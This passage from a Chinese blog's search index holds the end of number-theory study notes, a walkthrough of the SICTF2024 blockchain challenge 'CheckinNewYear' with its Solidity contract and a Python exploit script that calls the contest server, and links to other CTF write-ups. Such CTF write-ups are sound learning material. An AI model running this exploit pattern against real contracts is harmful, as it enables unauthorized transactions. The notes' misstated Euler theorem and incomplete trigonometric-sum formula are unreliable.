b_1M’_1M_1+b_2M’_2M_2+…+b_kM’_kM_k(mod\ M)<br>$$<br>这里M’i是满足同余式<br>$$<br>M’_iM_i\equiv 1(mod\ m_i)<br>$$<br>的正整数解，i&#x3D;1,2,…,k</p><p>其实百度百科上说的也不错：</p><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240229002625329.png" alt="image-20240229002625329"></p><p>根据不同的情况，中国剩余定理可以有不同的使用，但基本情况就是如上，对照着搓一下代码应该不难。</p><h2 id="第五章-剩余系，欧拉定理，费马定理及其应用"><a href="#第五章-剩余系，欧拉定理，费马定理及其应用" class="headerlink" title="第五章 剩余系，欧拉定理，费马定理及其应用"></a>第五章 剩余系，欧拉定理，费马定理及其应用</h2><h3 id="完全剩余系"><a href="#完全剩余系" class="headerlink" title="完全剩余系"></a>完全剩余系</h3><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240302002055889.png" alt="image-20240302002055889"></p><h3 id="一些结论-2"><a href="#一些结论-2" class="headerlink" title="一些结论"></a>一些结论</h3><h4 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h4><p>设m是一个大于1的整数，b是一个整数且满足条件(b,m)&#x3D;1.如果a1,a2,…am是模m的一个完全剩余系，则ba1,ba2,…,bam也是模m的一个完全剩余系</p><h4 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h4><p>设m是一个大于1的整数，而b,c是两个任意的整数但满足条件(b,m)&#x3D;1，如果a1,a2,…,am是模m的一个完全剩余系，则ba1+c,ba2+c,…,bam+c也是模m的一个完全剩余系</p><h4 id="3-2"><a href="#3-2" class="headerlink" title="3"></a>3</h4><p>如果m是一个大于1的整数而a,b是任意的两个整数，使得<br>$$<br>a\equiv b(mod\ m)<br>$$<br>成立，则有gcd(a,m)&#x3D;gcd(b,m)</p><h3 id="欧拉函数φ-m"><a href="#欧拉函数φ-m" class="headerlink" title="欧拉函数φ(m)"></a>欧拉函数φ(m)</h3><p>我们用φ(m)来表示不大于m而和m互素的正整数的个数。我们把φ(m)叫做欧拉函数。其中φ(1)&#x3D;1</p><h3 id="引理"><a href="#引理" class="headerlink" title="引理"></a>引理</h3><p>设l是一个正整数，p是一个素数，则我们有<br>$$<br>\varphi(p^l)&#x3D;p^{l-1}(p-1)<br>$$</p><h3 id="简化剩余系"><a href="#简化剩余系" class="headerlink" title="简化剩余系"></a>简化剩余系</h3><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240302145523366.png" alt="image-20240302145523366"></p><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240302145531674.png" alt="image-20240302145531674"></p><h3 id="一个结论"><a href="#一个结论" class="headerlink" title="一个结论"></a>一个结论</h3><p>设m是一个大于1的整数，a是一个整数且满足条件gcd(a,m)&#x3D;1.如果b1,b2,…bφ(m)是模m的一个简化剩余系，则<br>$$<br>ab_1,ab_2,…,ab_{\varphi (m)}<br>$$<br>也是模m的一个简化剩余系</p><h3 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h3><p>设m是一个大于1的整数，a是一个素数且满足条件gcd(a,m)&#x3D;1，则我们有<br>$$<br>a^{\varphi(m)}\equiv 1(mod\ m)<br>$$<br>上式在RSA算法中有重要作用</p><h3 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h3><p>对于欧拉定理有一种特殊情况，那就是当模m为素数是时，此时就可以得到费马小定理<br>$$<br>a^{p-1}\equiv 1(mod\ p)<br>$$</p><h2 id="第六章-小数、分数和实数"><a href="#第六章-小数、分数和实数" class="headerlink" title="第六章 小数、分数和实数"></a>第六章 小数、分数和实数</h2><h3 id="一些结论-3"><a href="#一些结论-3" class="headerlink" title="一些结论"></a>一些结论</h3><h4 id="1-3"><a href="#1-3" class="headerlink" title="1"></a>1</h4><p>设0&lt;a&lt;b，且gcd(a,b)&#x3D;1.如果a&#x2F;b能表示成纯循环小数，则我们有gcd(b,10)&#x3D;1</p><h4 id="2-3"><a href="#2-3" class="headerlink" title="2"></a>2</h4><p>设0&lt;a&lt;b，且gcd(a,b)&#x3D;1.令h是一个最小的正整数，能使<br>$$<br>10^h\equiv 1(mod\ b)<br>$$<br>成立，则a&#x2F;b能表示成纯循环小数0.a1…ah</p><h4 id="3-3"><a href="#3-3" class="headerlink" title="3"></a>3</h4><p>设b是一个正整数且gcd(10,b)&#x3D;1，令h是一个最小的正整数，能使<br>$$<br>10^h\equiv 1(mod\ b)<br>$$<br>成立，则有h|φ(b)</p><h4 id="4-2"><a href="#4-2" class="headerlink" title="4"></a>4</h4><p>设a,b,b1都是正整数，a&lt;b，gcd(a,b)&#x3D;1，b1&gt;1，gcd(b1,10)&#x3D;1.b&#x3D;2^α5^βb1，其中α,β都是非负整数但不同时为0.令h是一个最小的正整数且能使<br>$$<br>10^h\equiv 1(mod\ b_1)<br>$$<br>则当α≥β时我们有<br>$$<br>\frac{a}{b}&#x3D;0.a_t…a_a\dot a_\alpha…\dot a_{\alpha+h}<br>$$<br>而当α＜β时我们有<br>$$<br>\frac{a}{b}&#x3D;0.a_1…a_\beta \dot a_{\beta+1}…\dot a_{\beta+h}<br>$$</p><h2 id="第七章-连分数和数论分数"><a href="#第七章-连分数和数论分数" class="headerlink" title="第七章 连分数和数论分数"></a>第七章 连分数和数论分数</h2><h3 id="连分数"><a href="#连分数" class="headerlink" title="连分数"></a>连分数</h3><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240302235054370.png" alt="image-20240302235054370"></p><p>当1≤k≤n是一个整数时，我们把[a1,a2,…,ak]&#x3D;pk&#x2F;qk叫做(22)的第k个渐进分数。</p><h3 id="一些结论-4"><a href="#一些结论-4" class="headerlink" title="一些结论"></a>一些结论</h3><h4 id="1-4"><a href="#1-4" class="headerlink" title="1"></a>1</h4><p>设n≥3和连分数[a1,a2,…an]的渐进分数是p1&#x2F;q1,p2&#x2F;q2,…,pn&#x2F;qn,则在这些剪辑分数之间，下面的关系式成立<br>$$<br>p_1&#x3D;a_1,q_1&#x3D;1,p_2&#x3D;a_1a_2+1,q_2&#x3D;a_2<br>$$<br>而当3≤k≤n时，则有<br>$$<br>p_k&#x3D;a_kp_{k-1}+p_{k-2},q_k&#x3D;a_kq_{k-1}+q_{k-2}<br>$$</p><h4 id="2-4"><a href="#2-4" class="headerlink" title="2"></a>2</h4><p>如果连分数[a1,a2,…,an]的n个渐进分数是pk&#x2F;qk（其中k&#x3D;1,2,…,n），则当k≥2时我们有<br>$$<br>p_kq_{k-1}-p_{k-1}q_k&#x3D;(-1)^k<br>$$<br>而当k≥3时我们有<br>$$<br>p_kq_{k-2}-p_{k-2}q_k&#x3D;(-1)^{k-1}a_k<br>$$</p><h4 id="3-4"><a href="#3-4" class="headerlink" title="3"></a>3</h4><p>每一个有理数都能够表示成为有限连分数</p><h4 id="4-3"><a href="#4-3" class="headerlink" title="4"></a>4</h4><p>设[a1,a2,…,an…]是一个无限连分数，pk&#x2F;qk(k&#x3D;1,2,…)是它的第k个渐进分数，则当k≥2时我们有<br>$$<br>\frac{p_{2(k-1)}}{q_{2(k-1)}}&gt;\frac{p_{2k}}{q_{2k}},\frac{p_{2k-1}}{q_{2k-1}}&gt;\frac{p_{2k-3}}{q_{2k-3}},\frac{p_{2k}}{q_{2k}}&gt;\frac{p_{2k-1}}{q_{2k-1}}<br>$$</p><p>当k→∞时，pk&#x2F;qk有一极限，则我们有<br>$$<br>\frac{p_1}{q_1}&lt;\frac{p_3}{q_3}&lt;\frac{p_5}{q_5}&lt;…&lt;[a_1,a_2,…,a_n…]&lt;…&lt;\frac{p_6}{q_6}&lt;\frac{p_4}{q_4}&lt;\frac{p_2}{q_2}<br>$$</p><h3 id="取整函数"><a href="#取整函数" class="headerlink" title="取整函数"></a>取整函数</h3><p>设x是任何一个实数，我们用[x]来表示不大于x的最大整数，我们用{x}表示x-[x]</p><p>有如下性质：</p><p>(1) x&#x3D;[x]+{x},x-1&lt;[x]≤x</p><p>(2) 当n是一个整数时，我们有[n+x]&#x3D;n+[x]</p><p>(3) 当0≤x&lt;1时，有[x]&#x3D;0</p><h3 id="循环连分数"><a href="#循环连分数" class="headerlink" title="循环连分数"></a>循环连分数</h3><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240303145246724.png" alt="image-20240303145246724"></p><h3 id="x-x-的一些性质"><a href="#x-x-的一些性质" class="headerlink" title="[x],{x}的一些性质"></a>[x],{x}的一些性质</h3><h4 id="1-5"><a href="#1-5" class="headerlink" title="1"></a>1</h4><p>$$<br>[x]+[y]\leq [x+y],{x}+{y}\geq {x+y}<br>$$</p><p>$$<br>[-x]&#x3D;\begin{cases} -[x]+1, 当x不是整数时 \ -[x], 当x是整数时 \end{cases}<br>$$</p><h4 id="2-5"><a href="#2-5" class="headerlink" title="2"></a>2</h4><p>设n是任一个正整数而α是一个实数时，则有<br>$$<br>[\alpha]+[\alpha+\frac{1}{n}]+…+[\alpha+\frac{n-1}{n}]&#x3D;[n\alpha]<br>$$<br>成立</p><h4 id="3-5"><a href="#3-5" class="headerlink" title="3"></a>3</h4><p>设a,b是两个整数，b&gt;0，则有<br>$$<br>a&#x3D;b[\frac{a}{b}]+b{\frac{a}{b}},0\leq b{\frac{a}{b}}\leq b-1<br>$$</p><h4 id="4-4"><a href="#4-4" class="headerlink" title="4"></a>4</h4><p>我们有<br>$$<br>[2x]+[2y]\geq [x]+[y]+[x+y]<br>$$</p><h3 id="一些数论函数"><a href="#一些数论函数" class="headerlink" title="一些数论函数"></a>一些数论函数</h3><p>除了前面提到过的欧拉函数和取整函数以外，我们还有一些数论函数</p><h4 id="除数函数"><a href="#除数函数" class="headerlink" title="除数函数"></a>除数函数</h4><p>如果n是一个正整数，我们用d(n)来表示n的因数的个数。我们把d(n)叫做除数函数。</p><h5 id="1-6"><a href="#1-6" class="headerlink" title="1"></a>1</h5><p>设n&#x3D;p1^α1…pm^αm，其中p1,…pm都是不同的素数，而α1,…,αm都是正整数，则我们有<br>$$<br>d(n)&#x3D;(\alpha_1+1)…(\alpha_m+1)<br>$$</p><h5 id="2-6"><a href="#2-6" class="headerlink" title="2"></a>2</h5><p>设a,b是两个正整数而gcd(a,b)&#x3D;1，则我们有<br>$$<br>d(ab)&#x3D;d(a)d(b)<br>$$</p><h4 id="因数和"><a href="#因数和" class="headerlink" title="因数和"></a>因数和</h4><p>如果n是一个正整数，则我们把n的所有因数相加以后所得到的和叫做n的因数和，记作σ(n)</p><h5 id="1-7"><a href="#1-7" class="headerlink" title="1"></a>1</h5><p>设m,n是两个正整数且gcd(m,n)&#x3D;1，则我们有<br>$$<br>\sigma (mn)&#x3D;\sigma(m)\cdot\sigma(n)<br>$$</p><h4 id="真因数"><a href="#真因数" class="headerlink" title="真因数"></a>真因数</h4><p>如果n是一个正整数，则我们把除去n本身以外的n的因数都叫作n的真因数</p><h4 id="完全数"><a href="#完全数" class="headerlink" title="完全数"></a>完全数</h4><p>如果n是一个正整数，当我们把n的所有真因数相加以后，所得到的和恰好等于n时，则我们把n叫作完全数。或者说当σ(n)&#x3D;2n成立时，则我们把n叫作完全数。</p><h5 id="1-8"><a href="#1-8" class="headerlink" title="1"></a>1</h5><p>如果n是一个≥2的整数而2^n-1是一个素数，则<br>$$<br>2^{n-1}(2^n-1)<br>$$<br>是一个完全数</p><h4 id="σ和d的联系"><a href="#σ和d的联系" class="headerlink" title="σ和d的联系"></a>σ和d的联系</h4><p>如果n是一个正整数而λ是一个非负整数，则令<br>$$<br>\sigma_\lambda(n)&#x3D;\sum_{d|n}d^\lambda<br>$$<br>设m是一个整数，令m^0&#x3D;1，我们有<br>$$<br>\sigma_0(n)&#x3D;d(n)<br>$$<br>另外<br>$$<br>\sigma_1(n)&#x3D;\sigma(n)<br>$$</p><h4 id="莫比乌斯函数"><a href="#莫比乌斯函数" class="headerlink" title="莫比乌斯函数"></a>莫比乌斯函数</h4><p>$$<br>\mu(n)&#x3D;\begin{cases} 1,当n&#x3D;1时 \ (-1)^r,当n是r个不同的素数的乘积时 \ 0,当n能被一个素数的平方除尽时\end{cases}<br>$$</p><h5 id="1-9"><a href="#1-9" class="headerlink" title="1"></a>1</h5><p>如果m,n是两个正整数而gcd(m,n)&#x3D;1，则我们有<br>$$<br>\mu(mn)&#x3D;\mu(m)\cdot\mu(n)<br>$$</p><h5 id="2-7"><a href="#2-7" class="headerlink" title="2"></a>2</h5><p>我们有<br>$$<br>\sum_{d|n}\mu(d)&#x3D;\begin{cases} 1,当n&#x3D;1时 \ 0,当n&gt;1时\end{cases}<br>$$</p><h5 id="3-6"><a href="#3-6" class="headerlink" title="3"></a>3</h5><p>设n&#x3D;p1^α1…pm^αm，其中p1,…pm是m个不同的素数，而α1,…,αm都是正整数，则我们有<br>$$<br>\sum_{d|n}|\mu(d)|&#x3D;2^m<br>$$</p><h2 id="第八章-关于复数和三角和的概念"><a href="#第八章-关于复数和三角和的概念" class="headerlink" title="第八章  关于复数和三角和的概念"></a>第八章  关于复数和三角和的概念</h2><h3 id="三角函数泰勒公式"><a href="#三角函数泰勒公式" class="headerlink" title="三角函数泰勒公式"></a>三角函数泰勒公式</h3><p>这里贴一下三角函数泰勒公式<img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240303175243666.png" alt="image-20240303175243666"></p><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240303175252488.png" alt="image-20240303175252488"></p><h3 id="欧拉公式"><a href="#欧拉公式" class="headerlink" title="欧拉公式"></a>欧拉公式</h3><p>$$<br>e^{i\theta}&#x3D;cos\theta+isin\theta<br>$$</p><p>并且由此可以推知，<br>$$<br>|e^{i\theta}|&#x3D;\sqrt{cos^2\theta+sin^2\theta}&#x3D;1<br>$$</p><h3 id="负数的指数式"><a href="#负数的指数式" class="headerlink" title="负数的指数式"></a>负数的指数式</h3><p>根据上面的欧拉公式，复数z&#x3D;r(cosθ+isinθ)可以表示为简单形式<br>$$<br>z&#x3D;re^{i\theta}<br>$$</p><h3 id="一些结论-5"><a href="#一些结论-5" class="headerlink" title="一些结论"></a>一些结论</h3><h4 id="1-10"><a href="#1-10" class="headerlink" title="1"></a>1</h4><p>设θ1和θ2是两个实数，则我们有<br>$$<br>e^{i(\theta_1+\theta_2)}&#x3D;e^{i\theta_1}\cdot e^{i\theta_2}<br>$$</p><h4 id="2-8"><a href="#2-8" class="headerlink" title="2"></a>2</h4><p>设n是一个正整数而z&#x3D;a+bi是一个复数，则当z≠1时我们有<br>$$<br>\sum_{m&#x3D;0}^n{z^m}&#x3D;\frac{1-z^{n+1}}{1-z}<br>$$</p><h4 id="3-7"><a href="#3-7" class="headerlink" title="3"></a>3</h4><p>我们有<br>$$<br>\sum_{m&#x3D;0}^{n-1}{e^{i(\theta+\frac{n-1}{2}\varphi)}}\cdot\frac{sin\frac{n\varphi}{2}}{sin\frac{\varphi}{2}}<br>$$<br>其中n是一个正整数，φ≠2lπ，其中l是任一个整数，即{φ&#x2F;2x}≠0</p><h2 id="（也许暂时的）结尾"><a href="#（也许暂时的）结尾" class="headerlink" title="（也许暂时的）结尾"></a>（也许暂时的）结尾</h2><p>以上是本人读了前两册《初等数论》后记录的笔记。第二册的三角和部分及最后一册暂且先不读了，以后有需要再读了做补充。</p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记第一次上链</title>
      <link href="/2024/02/22/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/"/>
      <url>/2024/02/22/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目来源于SICTF2024 #Round 3 Blockchain方向的CheckinNewYear</p><p>当时这题没做出来，现在根据official writeup进行了一次复盘（</p></blockquote><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><img src="/images/记第一次上链/屏幕截图 2024-02-22 235215.png" alt="屏幕截图 2024-02-22 235215" style="zoom:50%;" /><p>如何注册使用metamask这里不再赘述，remix IDE网站：<a href="https://remix.ethereum.org/">https://remix.ethereum.org/</a></p><p>先生成一个deployer account:</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223012955732.png" alt="image-20240223012955732"></p><p>按照要求给这个账户去水龙头接点水，不然就会无法支付2中部署合约时产生的费用</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223013024832.png" alt="image-20240223013024832"></p><p>部署一下题目的智能合约，得到合约地址和token</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223013113909.png" alt="image-20240223013113909"></p><p>用4查看一下合约的源代码</p><img src="/images/记第一次上链/屏幕截图 2024-02-23 004703.png" alt="屏幕截图 2024-02-23 004703" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: shu shao de xiao mi di</span><br><span class="line">pragma solidity ^0.8.9;</span><br><span class="line">contract HappyNewYear&#123;</span><br><span class="line">    string private NewYear;</span><br><span class="line">    constructor(string memory _newyear )  &#123;</span><br><span class="line">        NewYear = _newyear;</span><br><span class="line">    &#125;</span><br><span class="line">    function happyNewYear(string memory _newYear) public payable &#123;</span><br><span class="line">        require(uint160(msg.sender) |</span><br><span class="line">        2**16 * 3**3 * 5 * 7 * 13 * 17 * 19 * 37 * 73 * 97 * 109 * 241 * 257 * 433 * 577 * 673 * 38737 * 487824887233 ==</span><br><span class="line">        2**2 * 17 * 67 * 733 * 316139 * 18992431891 * 72887484710091183279372959</span><br><span class="line">        ,&quot;Not this Year&quot;);</span><br><span class="line">        NewYear = _newYear;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">       function isSolved() public view returns (bool)&#123;</span><br><span class="line">        require(keccak256(abi.encodePacked(NewYear)) == keccak256(abi.encodePacked(&quot;Happy&quot;)),&quot;not HappyNewYear&quot;);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读一下代码逻辑，发现其中对用户的地址有限制。这里用两串较长的式子进行了简单的混淆，经过计算不难发现，这里的限制是要求用户地址的最后四位是2024。</p><p>在这里，official writeup中给出了一个可以专门用来生成指定形式地址的网站：<a href="https://vanity-eth.tk/">https://vanity-eth.tk/</a></p><blockquote><p>比赛期间做的时候就是卡在这里了，学长发了我exp.sol我都不会用。。。没想到其实有这么方便的网站~（T0T)</p></blockquote><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223183457544.png" alt="image-20240223183457544"></p><p>接下来只要给isSolved函数的NewYear值传一个”Happy”字符串就可以了</p><h2 id="python编写exp"><a href="#python编写exp" class="headerlink" title="python编写exp"></a>python编写exp</h2><p>官方给出的exp.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cheb3 <span class="keyword">import</span> Connection</span><br><span class="line"><span class="keyword">from</span> cheb3.utils <span class="keyword">import</span> compile_file</span><br><span class="line">entrant_abi, entrant_bytecode = compile_file(<span class="string">&quot;Example.sol&quot;</span>, <span class="string">&quot;HappyNewYear&quot;</span>,</span><br><span class="line"><span class="string">&quot;0.8.9&quot;</span>)[<span class="string">&#x27;HappyNewYear&#x27;</span>]  <span class="comment">#确保Example.sol跟这个py文件在同一路径下</span></span><br><span class="line">conn = Connection(<span class="string">&#x27;http://124.221.86.119:40002&#x27;</span>)</span><br><span class="line">existing_account =conn.account(<span class="string">&quot;...&quot;</span>)  <span class="comment">#这里是填写上面生成的账号的Private Key</span></span><br><span class="line">target_address = <span class="string">&quot;0x3C58Ec40D7E79BEf9c7987b7c5414b0B13CcEDEe&quot;</span>  <span class="comment">#合约地址</span></span><br><span class="line">entrant_contract = conn.contract(</span><br><span class="line">existing_account,</span><br><span class="line">address=target_address,</span><br><span class="line">abi=entrant_abi</span><br><span class="line">)</span><br><span class="line">entrant_contract.functions.happyNewYear(<span class="string">&quot;Happy&quot;</span>).send_transaction()</span><br></pre></td></tr></table></figure><p>成功运行以后只要去nc的3中查看即可</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223010429906.png" alt="image-20240223010429906"></p><h2 id="remix"><a href="#remix" class="headerlink" title="remix"></a>remix</h2><p>新进一个test.sol文件，把得到的合约源码复制进去</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223010958373.png" alt="image-20240223010958373"></p><p>编译一下，注意compiler的版本，绿色的√出现即为编译成功</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223011101264.png" alt="image-20240223011101264"></p><p>在metamask上手动添加网络，网络名称随便写，RPC题目中的复制过来（记得加上http），链ID随便写，保存的时候它会教你做事，货币符号随便写</p><blockquote><p>由于之前做题的时候添加过了，这里有个报错</p></blockquote><img src="/images/记第一次上链/image-20240223011626597.png" alt="image-20240223011626597" style="zoom:50%;" /><p>在添加账户中导入账户，填写上面生成的账户的Private Key</p><img src="/images/记第一次上链/image-20240223011806125.png" alt="image-20240223011806125" style="zoom:50%;" /><p>开始将智能合约部署上链，ENVIRONMENT选Inject Provider - MetaMask，确保自己连入的是那个2024结尾的账户（点那个地球的标志查看），At Address填入合约地址，然后点一下At Address，给happyNewYear传一个Happy，然后点一下happyNewYear，确认交易，大功告成！</p><img src="/images/记第一次上链/image-20240223012042008.png" alt="image-20240223012042008" style="zoom:50%;" /><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223012345867.png" alt="image-20240223012345867"></p><img src="/images/记第一次上链/image-20240223012407277.png" alt="image-20240223012407277" style="zoom:50%;" /><p>nc一下查看3即可看到flag</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223010429906.png" alt="image-20240223010429906"></p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Academic </tag>
            
            <tag> Blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SICTF2024 Round3 Writeup</title>
      <link href="/2024/02/19/SICTF2024-Writeup/"/>
      <url>/2024/02/19/SICTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/SICTF2024Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>“[签到]签到” and “WHO?WHO?WHO” in “Misc”, “[Game][Battle City]“ in “Reverse” ,and “Forensics” was written by <strong>f4k3r</strong></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> SICTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGame2024 Writeup</title>
      <link href="/2024/02/06/HGame2024-Writeup/"/>
      <url>/2024/02/06/HGame2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Week1-Writeup"><a href="#Week1-Writeup" class="headerlink" title="Week1 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/HGame2024_Week1_Writeup.pdf">Week1 Writeup</a></h4><h4 id="Week2-Writeup"><a href="#Week2-Writeup" class="headerlink" title="Week2 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/HGame2024_Week2_Writeup.pdf">Week2 Writeup</a></h4><h4 id="Week3-Writeup"><a href="#Week3-Writeup" class="headerlink" title="Week3 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/HGame2024_Week3_Writeup.pdf">Week3 Writeup</a></h4><h4 id="Week4-Writeup"><a href="#Week4-Writeup" class="headerlink" title="Week4 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/HGame2024_Week4_Writeup.pdf">Week4 Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> HGame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BeginCTF2024 Writeup</title>
      <link href="/2024/02/06/BeginCTF2024-Writeup/"/>
      <url>/2024/02/06/BeginCTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/BeginCTF2024_Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> BeginCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2023 Writeup</title>
      <link href="/2024/01/24/NCTF2023-Writeup/"/>
      <url>/2024/01/24/NCTF2023-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/NCTF2023_Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>“Web” was written by <strong>wuming</strong></p><p>“Reverse” was written by <strong>fermata</strong></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> NCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame2023 Writeup</title>
      <link href="/2024/01/24/0xGame2023-Writeup/"/>
      <url>/2024/01/24/0xGame2023-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Week1-Writeup"><a href="#Week1-Writeup" class="headerlink" title="Week1 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/0xGame2023_Week1_Writeup.pdf">Week1 Writeup</a></h4><h4 id="Week2-Writeup"><a href="#Week2-Writeup" class="headerlink" title="Week2 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/0xGame2023_Week2_Writeup.pdf">Week2 Writeup</a></h4><h4 id="Week3-Writeup"><a href="#Week3-Writeup" class="headerlink" title="Week3 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/0xGame2023_Week3_Writeup.pdf">Week3 Writeup</a></h4><h4 id="Week4-Writeup"><a href="#Week4-Writeup" class="headerlink" title="Week4 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/0xGame2023_Week4_Writeup.pdf">Week4 Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 0xGame </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>Categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>links</title>
      <link href="/links/index.html"/>
      <url>/links/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Hello, world!</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
